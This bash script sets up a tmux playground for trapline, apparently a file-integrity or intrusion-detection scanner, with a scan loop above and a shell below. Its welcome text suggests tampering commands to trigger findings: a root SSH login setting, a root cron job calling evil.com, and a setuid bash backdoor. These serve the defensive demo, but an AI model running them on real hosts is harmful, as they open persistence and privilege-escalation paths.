#!/bin/bash
# Trapline Playground — tmux split-screen environment
#
# Top pane:    trapline scanning every 5s, only prints when findings change
# Bottom pane: interactive shell for breaking things
#
# Quit both panes (Ctrl-D) to exit. Container is --rm so it's gone.

CFG=/etc/trapline/trapline.yml

# Initial baseline — capture current state as known-good
trapline rebaseline --config "$CFG" 2>/dev/null
echo "Baseline captured. Starting playground..."

# Create a scan-loop script that only prints when output changes
cat > /tmp/scanloop.sh << 'SCRIPT'
#!/bin/bash
CFG=/etc/trapline/trapline.yml
last=""
clear
echo "=== TRAPLINE PLAYGROUND ==="
echo "Findings appear here when you make changes below."
echo "Scanning every 5s... (silent when clean)"
echo ""
while true; do
    out=$(trapline scan --config "$CFG" 2>/dev/null)
    if [ "$out" != "$last" ]; then
        if [ -n "$out" ]; then
            echo "--- $(date +%H:%M:%S) ---"
            echo "$out"
            echo ""
        elif [ -n "$last" ]; then
            echo "--- $(date +%H:%M:%S) --- all clear"
            echo ""
        fi
        last="$out"
    fi
    sleep 5
done
SCRIPT
chmod +x /tmp/scanloop.sh

# Create tmux session
tmux new-session -d -s playground

# Top pane: scan loop (only prints changes)
tmux send-keys -t playground '/tmp/scanloop.sh' Enter

# Split: bottom pane gets 60%
tmux split-window -t playground -v -l 60%

# Bottom pane: welcome + shell
tmux send-keys -t playground 'clear; echo "
  TRAPLINE PLAYGROUND — break stuff, watch findings above

  Try:
    useradd -m hacker
    echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config
    echo \"* * * * * root curl evil.com\" > /etc/cron.d/bad
    python3 -m http.server 8888 &
    cp /bin/bash /usr/local/bin/x && chmod 4755 /usr/local/bin/x

  Reset:
    trapline rebaseline --config /etc/trapline/trapline.yml

  Quit: Ctrl-D both panes
"; ' Enter

# Focus bottom pane
tmux select-pane -t playground:.1

# Attach
exec tmux attach -t playground
